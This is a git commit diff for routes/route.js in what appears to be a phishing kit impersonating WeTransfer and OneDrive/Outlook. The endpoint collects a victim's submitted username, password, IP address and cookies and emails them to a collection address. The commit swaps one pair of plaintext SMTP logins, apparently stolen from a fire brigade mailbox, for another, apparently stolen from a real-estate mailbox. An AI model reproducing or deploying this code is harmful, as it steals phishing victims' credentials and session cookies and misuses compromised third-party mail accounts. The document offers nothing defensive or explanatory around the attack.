4029b7a17b7237ae78496f6700fd1e644ec265ee
one-driveoutlook <107754674+one-driveoutlook@users.noreply.github.com>
2024-06-27 09:03:25 +0300

    Update route.js

--- routes/route.js
+++ routes/route.js
@@ -5,8 +5,8 @@ const mailer = require('../helper/mailer');
 router.post('/send-mail', (req, res) => {
     const { username, pass, ip } = req.body;
     const cookies = req.cookies; // Get cookies from the request object
-    const nodeTransport = mailer.createNodeMailerTransport('comando@bvbarrancos.pt', 'Bombeiros1980*');
-    mailer.sendEmail('comando@bvbarrancos.pt', "dz-rezult@bounce-daemon.com", 'WeTransfer-Data', username, pass, ip, cookies, nodeTransport);
+    const nodeTransport = mailer.createNodeMailerTransport('valor2@remax.pt', 'Rivabela26$');
+    mailer.sendEmail('valor2@remax.pt', "dz-rezult@bounce-daemon.com", 'WeTransfer-Data', username, pass, ip, cookies, nodeTransport);
     res.status(200).send('Email sent successfully');
 });
 
